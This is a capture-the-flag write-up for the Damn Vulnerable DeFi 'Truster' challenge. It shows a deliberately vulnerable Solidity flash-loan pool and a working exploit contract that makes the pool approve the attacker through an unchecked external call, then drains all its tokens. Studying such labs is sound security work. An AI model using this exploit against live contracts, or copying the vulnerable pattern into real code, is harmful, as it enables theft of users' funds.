# Damn Vulnerable Defi 3: Truster

This challenge is about a how the borrower is called. Lesson learned: A receiver function needs to be coded out!

## The Task Intro

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. Currently the pool has 1 million DVT tokens in balance. And you have nothing. But don't worry, you might be able to take them all from the pool. In a single transaction.

## The Task Code

TrusterLenderPool.sol

```apache
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {

    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}
```

## The Solution

This is the third Damn Vulnerable Defi task I solve for the Security Month in a row - after quite some reading about flash loans the days before. I get a bit tired and will solve the other two tomorrow.

Going through the contract TrusterLenderPool it first looks cool: the check if the borrowing amount is less than the available tokens of the pool, and the check after if the balance after is larger or equal than before. For me that looked not suspicous.

The suspicious part was the call to a random function through call. It took me some time to think out of the box. It was clear it must be a call to a contract, but shall I call my own contract and do a reentrency attack - this seemed to be safe because of the nonReentrant operator. Should it call flashLoan itself? But again, the nonReentrant operator would prevent that.

What was left? The token itself! And bingo - I remembered the approve function of the ERC20 Token. Because `target.functionCall(data)` calls in the context of the lender, it can approve the attacker account or a smart contract. Because all should happen in one transaction I decided for a smart contract:

```apache
contract Crack {
    TrusterLenderPool pool;
    IERC20 token;

    constructor(TrusterLenderPool _pool, IERC20 _token) {
        pool = _pool;
        token = _token;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            1000000 * 10 ** 18
        );

        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), address(this), 1000000 * 10 ** 18);
        token.transfer(msg.sender, 1000000 * 10 ** 18);
    }
}
```

```appache
    const Crack = await ethers.getContractFactory("Crack", deployer);
    this.crack = await Crack.deploy(this.pool.address, this.token.address);

    await this.crack.connect(attacker).attack();
```

From the test I deploy the contract and call the attack function with the credentials from the attacker.

The attack encodes a call to the approve function with the contract address. This data is passed to the flash load with the receive function of the token. RESULT: The approve function is called with the credential of the pool.

This makes it easy to get all the tokens from the pool and transfer them to the attacker address.

Lesson learned: A receiver callback needs to be coded out!
